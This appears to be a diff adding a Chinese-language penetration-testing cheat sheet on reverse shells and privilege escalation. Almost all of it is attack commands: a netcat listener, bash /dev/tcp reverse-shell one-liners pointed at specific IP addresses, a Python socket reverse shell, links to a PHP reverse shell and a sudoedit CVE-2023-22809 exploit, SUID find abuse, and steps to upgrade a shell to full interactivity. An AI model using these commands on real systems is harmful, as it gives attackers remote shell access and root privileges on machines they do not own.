@@ -1,0 +1,50 @@
+
+反弹说明 shell
+netcat下载 https://eternallybored.org/misc/netcat/
+首先在kali上输入：
+nc -lvvp 7777
+
+目标机上输入:
+ /bin/bash -i >& /dev/tcp/111.111.111.111/9999 0>&1
+
+#
+#
+find 具有suid权限的filename -exec whoami \;
+
+find ./a.txt -exec whoami \;
+########
+#exploit.sh
+#103.165.81.6
+bash -i >& /dev/tcp/103.165.81.6/7777 0>&1
+ 方法1：bash反弹
+bash -i >& /dev/tcp/ip/port 0>&1
+
+方法2 
+使用大码:license.php 选择php
+
+方法3 执行php
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+
+pythony
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#############
+# shell回来后
+python -c 'import pty; pty.spawn("/bin/bash")'  //spawn pty
+resize  //根据当前终端尺寸重新设置COLUMNS和LINES环境变量
+
+//如果没有resize命令，手动根据前面stty -a结果中的rows和columns值设置，如
+export COLUMNS=204 LINES=51
+
+//至此已拥有完全交互的shell
+#完全交互教程
+https://www.jianshu.com/p/e7202cb2c3dd
+https://www.imbeee.com/2017/12/24/full-functional-reverse-shell/
+##############
+
+#######
+sudo 提权
+执行 exploit.sh
+ https://raw.githubusercontent.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc/main/exploit.sh
